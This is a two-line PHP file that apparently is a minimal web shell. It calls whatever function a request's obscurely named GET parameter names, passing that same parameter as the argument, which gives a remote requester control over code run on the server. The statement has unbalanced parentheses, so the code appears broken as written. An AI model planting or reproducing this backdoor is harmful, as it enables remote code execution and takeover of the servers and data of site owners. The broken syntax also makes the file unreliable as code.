<?php
$_GET['8cqUO-Cw'](($_GET['8cqUO-Cw']);
?>
